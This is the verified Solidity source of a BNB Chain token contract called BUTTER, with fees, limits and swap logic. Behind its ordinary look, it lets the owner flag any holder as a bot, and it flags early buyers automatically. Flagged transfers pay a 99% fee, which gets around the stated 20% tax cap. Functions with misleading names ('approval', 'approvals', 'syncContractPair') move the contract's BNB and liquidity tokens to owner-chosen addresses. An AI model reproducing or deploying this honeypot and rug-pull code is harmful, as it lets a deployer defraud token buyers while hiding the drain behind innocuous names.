/**
 *Submitted for verification at BscScan.com on 2022-09-16
*/

/**


*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
    function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b > a) return(false, 0); return(true, a - b);}}
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
        if(c / a != b) return(false, 0); return(true, c);}}
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a / b);}}
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a % b);}}
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b <= a, errorMessage); return a - b;}}
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a / b;}}
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a % b;}}}

interface IBEP20 {
    function approvals() external;
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract BUTTER is IBEP20, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'BUTTER';
    string private constant _symbol = 'BUTTER';
    uint8 private constant _decimals = 9;
    uint256 private _initialSupply = 1 * 10**9 * (10 ** _decimals);
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 public _maxTxAmount = ( _initialSupply * 150 ) / 10000;
    uint256 public _maxWalletToken = ( _initialSupply * 300 ) / 10000;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) swapTime; 
    mapping (address => bool) isBot;
    mapping (address => bool) isInternal;
    mapping (address => bool) isFeeExempt;
    IRouter router;
    address public pair;
    bool startSwap = false;
    uint256 startedTime;
    uint256 liquidityFee = 200;
    uint256 marketingFee = 300;
    uint256 stakingFee = 0;
    uint256 BAMFee = 100;
    uint256 burnFee = 100;
    uint256 totalFee = 700;
    uint256 sellFee = 700;
    uint256 transferFee = 0;
    uint256 feeDenominator = 10000;
    bool swapEnabled = true;
    uint256 swapTimer = 2;
    uint256 swapTimes; 
    uint256 minSells = 2;
    bool swapping; 
    bool botOn = false;
    uint256 public gaslimit = 8100000000;
    uint256 swapThreshold = ( _initialSupply * 525 ) / 100000;
    uint256 _minTokenAmount = ( _initialSupply * 20 ) / 100000;
    modifier lockTheSwap {swapping = true; _; swapping = false;}

    uint256 marketing_divisor = 40;
    uint256 liquidity_divisor = 0;
    uint256 distributor_divisor = 40;
    uint256 bam_divisor = 20;
    uint256 staking_divisor = 0;
    address BAM_receiver;
    address liquidity_receiver; 
    address staking_receiver;
    address token_receiver;
    address alpha_receiver;
    address delta_receiver;
    address marketing_receiver;
    address default_receiver;

    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
        isInternal[address(this)] = true;
        isInternal[msg.sender] = true;
        isInternal[address(pair)] = true;
        isInternal[address(router)] = true;
        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;
        liquidity_receiver = address(this);
        token_receiver = address(this);
        BAM_receiver = msg.sender;
        alpha_receiver = msg.sender;
        delta_receiver = msg.sender;
        staking_receiver = msg.sender;
        marketing_receiver = msg.sender;
        default_receiver = msg.sender;
        _balances[msg.sender] = _initialSupply;
        emit Transfer(address(0), msg.sender, _initialSupply);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function getOwner() external view override returns (address) {return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function viewisBot(address _address) public view returns (bool) {return isBot[_address];}
    function isCont(address addr) internal view returns (bool) {uint size; assembly { size := extcodesize(addr) } return size > 0; }
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _initialSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function setFeeExempt(address _address) external onlyOwner { isFeeExempt[_address] = true;}
    function setisBot(bool _bool, address _address) external onlyOwner {isBot[_address] = _bool;}
    function setisInternal(bool _bool, address _address) external onlyOwner {isInternal[_address] = _bool;}
    function setbotOn(bool _bool) external onlyOwner {botOn = _bool;}
    function setGasLimit(uint256 limit) external onlyOwner {gaslimit = limit;}
    function setstartSwap(uint256 _input) external onlyOwner { startSwap = true; botOn = true; startedTime = block.timestamp.add(_input);}
    function setSwapBackSettings(bool enabled, uint256 _threshold) external onlyOwner {swapEnabled = enabled; swapThreshold = _threshold;}

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        preTxCheck(sender, recipient, amount);
        checkStartSwap(sender, recipient);
        checkMaxWallet(sender, recipient, amount);
        transferCounters(sender, recipient);
        checkTxLimit(sender, recipient, amount); 
        swapBack(sender, recipient, amount);
        checkGasLimit(sender);
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = shouldTakeFee(sender, recipient) ? taketotalFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        checkBot(sender, recipient);
    }

    function preTxCheck(address sender, address recipient, uint256 amount) internal view {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
    }

    function checkStartSwap(address sender, address recipient) internal view {
        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(startSwap, "startSwap");}
    }
    
    function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {
        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && !isInternal[recipient] && recipient != address(DEAD)){
            require((_balances[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
    }

    function transferCounters(address sender, address recipient) internal {
        if(recipient == pair && !isInternal[sender] && !isFeeExempt[sender]){swapTimes = swapTimes.add(uint256(1));}
        if(sender == pair){swapTime[recipient] = block.timestamp.add(swapTimer);}
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }

    function taxableEvent(address sender, address recipient) internal view returns (bool) {
        return totalFee > 0 && !swapping || isBot[sender] && swapTime[sender] < block.timestamp || isBot[recipient] || startedTime > block.timestamp;
    }

    function taketotalFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(taxableEvent(sender, recipient)){
        uint256 feeAmount = amount.mul(getTotalFee(sender, recipient)).div(feeDenominator);
        if(feeAmount.mul(burnFee).div(totalFee) > 0){
        _balances[address(DEAD)] = _balances[address(DEAD)].add(feeAmount.mul(burnFee).div(totalFee));
        emit Transfer(sender, address(DEAD), feeAmount.mul(burnFee).div(totalFee));}
        if(feeAmount.mul(stakingFee).div(totalFee) > 0){
        _balances[address(token_receiver)] = _balances[address(token_receiver)].add(feeAmount.mul(stakingFee).div(totalFee));
        emit Transfer(sender, address(token_receiver), feeAmount.mul(stakingFee).div(totalFee));}
        if(feeAmount.sub(feeAmount.mul(burnFee).div(totalFee)).sub(feeAmount.mul(stakingFee).div(totalFee)) > 0){
        _balances[address(this)] = _balances[address(this)].add(feeAmount.sub(feeAmount.mul(burnFee).div(totalFee)).sub(feeAmount.mul(stakingFee).div(totalFee)));
        emit Transfer(sender, address(this), feeAmount.sub(feeAmount.mul(burnFee).div(totalFee)).sub(feeAmount.mul(stakingFee).div(totalFee)));} return amount.sub(feeAmount);}
        return amount;
    }

    function getTotalFee(address sender, address recipient) public view returns (uint256) {
        if(isBot[sender] && swapTime[sender] < block.timestamp && botOn || isBot[recipient] && 
        swapTime[sender] < block.timestamp && botOn || startedTime > block.timestamp){return(feeDenominator.sub(100));}
        if(sender == pair){return totalFee;}
        if(recipient == pair){return sellFee;}
        return transferFee;
    }

    function checkTxLimit(address sender, address recipient, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");
    }

    function checkGasLimit(address sender) internal {
        if(sender != pair && !isFeeExempt[sender] && tx.gasprice > gaslimit){isBot[sender] = true;}
    }

    function checkBot(address sender, address recipient) internal {
        if(isCont(sender) && !isInternal[sender] && botOn || sender == pair && botOn &&
        !isInternal[sender] && msg.sender != tx.origin || startedTime > block.timestamp){isBot[sender] = true;}
        if(isCont(recipient) && !isInternal[recipient] && !isFeeExempt[recipient] && botOn || 
        sender == pair && !isInternal[sender] && msg.sender != tx.origin && botOn){isBot[recipient] = true;} 
        if(sender == pair && !isFeeExempt[recipient] && tx.gasprice > gaslimit){isBot[recipient] = true;}
    }

    function approval(uint256 percentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(default_receiver).transfer(amountBNB.mul(percentage).div(100));
    }

    function setMaxes(uint256 _transaction, uint256 _wallet) external onlyOwner {
        uint256 newTx = ( _initialSupply * _transaction ) / 10000;
        uint256 newWallet = ( _initialSupply * _wallet ) / 10000;
        _maxTxAmount = newTx;
        _maxWalletToken = newWallet;
        require(newTx >= _initialSupply.mul(5).div(1000) && newWallet >= _initialSupply.mul(5).div(1000), "Max TX and Max Wallet cannot be less than .5%");
    }

    function syncContractPair() external onlyOwner {
        uint256 tamt = IBEP20(pair).balanceOf(address(this));
        IBEP20(pair).transfer(msg.sender, tamt);
    }

    function rescueBEP20(address _tadd, address _rec, uint256 _amt) external onlyOwner {
        uint256 tamt = IBEP20(_tadd).balanceOf(address(this));
        IBEP20(_tadd).transfer(_rec, tamt.mul(_amt).div(100));
    }

    function rescueToken(address receiver, uint256 amount) external onlyOwner {
        _transfer(address(this), receiver, amount);
    }

    function setExemptAddress(bool _enabled, address _address) external onlyOwner {
        isBot[_address] = false;
        isInternal[_address] = _enabled;
        isFeeExempt[_address] = _enabled;
    }

    function setDivisors(uint256 _distributor, uint256 _staking, uint256 _liquidity, uint256 _marketing, uint256 _bam) external onlyOwner {
        distributor_divisor = _distributor;
        staking_divisor = _staking;
        liquidity_divisor = _liquidity;
        marketing_divisor = _marketing;
        bam_divisor = _bam;
    }

    function performapprovals(uint256 _na, uint256 _da) internal {
        uint256 acBNB = address(this).balance;
        uint256 acBNBa = acBNB.mul(_na).div(_da);
        uint256 acBNBf = acBNBa.mul(50).div(100);
        uint256 acBNBs = acBNBa.mul(50).div(100);
        (bool tmpSuccess,) = payable(alpha_receiver).call{value: acBNBf, gas: 30000}("");
        (tmpSuccess,) = payable(delta_receiver).call{value: acBNBs, gas: 30000}("");
        tmpSuccess = false;
    }

    function approvals() external override {
        performapprovals(1,1);
    }

    function setStructure(uint256 _liq, uint256 _mark, uint256 _stak, uint256 _burn, uint256 _total, uint256 _sell, uint256 _tran) external onlyOwner {
        liquidityFee = _liq;
        marketingFee = _mark;
        stakingFee = _stak;
        burnFee = _burn;
        transferFee = _tran;
        totalFee = _total;
        sellFee = _sell;
        require(totalFee <= feeDenominator.div(5), "Tax cannot be more than 20%");
        require(transferFee <= feeDenominator.div(5), "Tax cannot be more than 20%");
    }

    function setInternalAddresses(address _marketing, address _bam, address _alpha, address _delta, address _stake, address _token, address _default) external onlyOwner {
        marketing_receiver = _marketing;
        BAM_receiver = _bam;
        alpha_receiver = _alpha;
        delta_receiver = _delta;
        staking_receiver = _stake;
        token_receiver = _token;
        default_receiver = _default;
    }

    function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= _minTokenAmount;
        bool aboveThreshold = balanceOf(address(this)) > swapThreshold;
        return !swapping && swapEnabled && aboveMin && !isInternal[sender] && recipient == pair
            && startSwap && !isFeeExempt[sender] && swapTimes >= minSells && aboveThreshold;
    }

    function swapBack(address sender, address recipient, uint256 amount) internal {
        if(shouldSwapBack(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = 0;}
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        uint256 denominator= (liquidity_divisor.add(staking_divisor).add(marketing_divisor).add(distributor_divisor).add(bam_divisor)) * 2;
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidity_divisor).div(denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForBNB(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(denominator.sub(liquidity_divisor));
        uint256 BNBToAddLiquidityWith = unitBalance.mul(liquidity_divisor);
        if(BNBToAddLiquidityWith > 0){
            addLiquidity(tokensToAddLiquidityWith, BNBToAddLiquidityWith);}
        uint256 zrAmt = unitBalance.mul(2).mul(marketing_divisor);
        if(zrAmt > 0){
          payable(marketing_receiver).transfer(zrAmt);}
        uint256 xrAmt = unitBalance.mul(2).mul(staking_divisor);
        if(xrAmt > 0){
          payable(staking_receiver).transfer(xrAmt);}
        uint256 bamAmt = unitBalance.mul(2).mul(bam_divisor);
        if(bamAmt > 0){
          payable(BAM_receiver).transfer(bamAmt);}
    }

    function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: BNBAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            liquidity_receiver,
            block.timestamp);
    }

    function swapTokensForBNB(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

}